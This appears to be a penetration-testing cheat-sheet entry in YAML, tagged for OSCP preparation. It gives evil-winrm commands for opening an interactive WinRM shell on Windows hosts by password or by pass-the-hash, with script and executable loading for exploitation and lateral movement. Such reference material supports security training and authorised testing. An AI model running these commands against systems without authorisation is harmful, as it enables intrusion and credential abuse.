---
variants:
  - label: password
    command: |
      evil-winrm -i $IP -u $USER -p $PASSWORD
  - label: pth
    command: |
      evil-winrm -i $IP -u $USER -H $HASH
  - label: scripts
    command: |
      evil-winrm -i $IP -u $USER -p $PASSWORD -s /scripts -e /executables
description: Interactive WinRM shell, by auth method, with upload, download, and script loading
os: [Linux]
category: [oscp, cli]
service: [WinRM]
phase: [Exploitation, LateralMovement]
references:
  - https://www.kali.org/tools/evil-winrm/
  - https://github.com/Hackplayers/evil-winrm
---
